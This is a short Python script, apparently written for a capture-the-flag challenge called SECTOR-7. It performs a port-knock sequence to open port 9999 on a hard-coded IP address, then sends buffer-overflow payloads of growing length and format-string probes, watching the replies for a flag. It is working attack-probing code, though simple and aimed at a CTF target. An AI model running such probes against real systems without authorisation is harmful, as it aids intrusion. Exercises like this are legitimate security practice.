#!/usr/bin/env python3
"""
Test for buffer overflow in SECTOR-7
"""

import socket
import time

target_ip = "13.206.58.35"
target_port = 9999

def knock_first():
    """Knock to open port 9999"""
    sequence = [9000, 2600, 1337]
    for port in sequence:
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.settimeout(0.5)
            sock.connect((target_ip, port))
            sock.close()
        except:
            pass
        time.sleep(0.3)

def test_payload(payload, description):
    """Test a specific payload"""
    print(f"\n[*] Testing: {description}")
    print(f"    Payload length: {len(payload)}")
    
    try:
        knock_first()
        time.sleep(1)
        
        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        sock.settimeout(5)
        sock.connect((target_ip, target_port))
        
        # Receive banner
        banner = sock.recv(4096)
        
        # Send payload
        sock.send(payload + b"\n")
        
        # Try to receive response
        try:
            response = sock.recv(4096)
            resp_text = response.decode('utf-8', errors='ignore')
            print(f"    Response: {resp_text[:300]}")
            
            # Check for interesting responses
            if "flag" in resp_text.lower() or "kaal{" in resp_text.lower():
                print(f"\n[!!!] FOUND FLAG: {resp_text}")
            elif "access granted" in resp_text.lower() or "success" in resp_text.lower():
                print(f"\n[!] ACCESS GRANTED: {resp_text}")
            elif "denied" not in resp_text.lower():
                print(f"    [+] Unusual response (not denied)")
        except socket.timeout:
            print("    [!] No response (possible crash?)")
        except Exception as e:
            print(f"    [!] Error receiving: {e}")
        
        sock.close()
        
    except Exception as e:
        print(f"    [-] Connection error: {e}")
    
    time.sleep(2)

print("[*] SECTOR-7 Buffer Overflow Testing")
print(f"[*] Target: {target_ip}:{target_port}\n")

# Test various payload sizes
test_payloads = [
    (b"A" * 10, "Small payload (10 bytes)"),
    (b"A" * 50, "Medium payload (50 bytes)"),
    (b"A" * 100, "Large payload (100 bytes)"),
    (b"A" * 200, "Very large payload (200 bytes)"),
    (b"A" * 500, "Huge payload (500 bytes)"),
    (b"A" * 1000, "Massive payload (1000 bytes)"),
]

for payload, desc in test_payloads:
    test_payload(payload, desc)

# Try format string attacks
print("\n[*] Testing format string vulnerabilities...")
format_strings = [
    b"%x %x %x %x",
    b"%s %s %s %s",
    b"%p %p %p %p",
]

for fs in format_strings:
    test_payload(fs, f"Format string: {fs.decode()}")

print("\n[*] Testing complete")
